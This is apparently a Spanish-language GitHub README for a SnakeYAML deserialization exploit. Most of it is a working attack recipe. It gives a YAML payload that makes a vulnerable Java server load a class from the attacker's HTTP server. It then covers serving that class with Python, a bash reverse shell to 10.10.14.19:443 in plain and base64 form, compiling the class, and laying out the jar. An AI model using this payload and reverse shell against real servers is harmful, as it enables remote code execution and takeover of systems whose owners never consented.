# yaml-parser-payload

Payload para ejecutar una reverse shell en un servidor yaml en java.

Esto lo pondremos en el servidor victima para que nos ejecute nuestro payload  con nuestra r_shell.
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://my_python_server/"]
  ]]
]
```
![](https://github.com/aquilino/yaml-parser-payload/blob/main/img/parser_web.jpg)
![](https://github.com/aquilino/yaml-parser-payload/blob/main/img/python%20server.jpg)
![](https://github.com/aquilino/yaml-parser-payload/blob/main/img/nc.jpg)

En nuestra terminal compartiremos un server con python para que se conecte nuestra victima hacia nosotros asi cargar el payload.
```bash
sudo python3 -m hhtp.server 80
```
Editaremos nuestro archivo AwesomeScriptEngineFactory.java
y añadiremos nuestra reverse_shell en bash pero codificado en base64 lo codificaremos en esta pagina.
```reverse
bash -i >& /dev/tcp/10.10.14.19/443 0>&1

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOS80NDMgMD4mMQ==}|{base64,-d}|{bash,-i}
```
in this page encode reverse shell  in base64 http://www.jackson-t.ca/runtime-exec-payloads.html

lo compilamos :
necesitaremos jdk instalado ojo!!!!

------bash console or cmd -----
```bash
javac AwesomeScriptEngineFactory.java
```
Nos generara el archivo 'AwesomeScriptEngineFactory.class'. y lo introduciremos en la carpeta h1dr0.

La estructura del Payload tiene que ser asi para que el servidor haga la peticion y encuetre el archivo. 
```tree
 exploit /
  |-->      META-INF/services/javax.script.ScriptEngineFactory dentro de este archivo escribir esto -> h1dr0.AwesomeScriptEngineFactory/
  |-->      h1dr0/AwesomeScriptEngineFactory.class
```




A tiny project for generating payloads for the SnakeYAML deserialization gadget (taken from https://github.com/mbechler/marshalsec):

thanks @marshalsec.


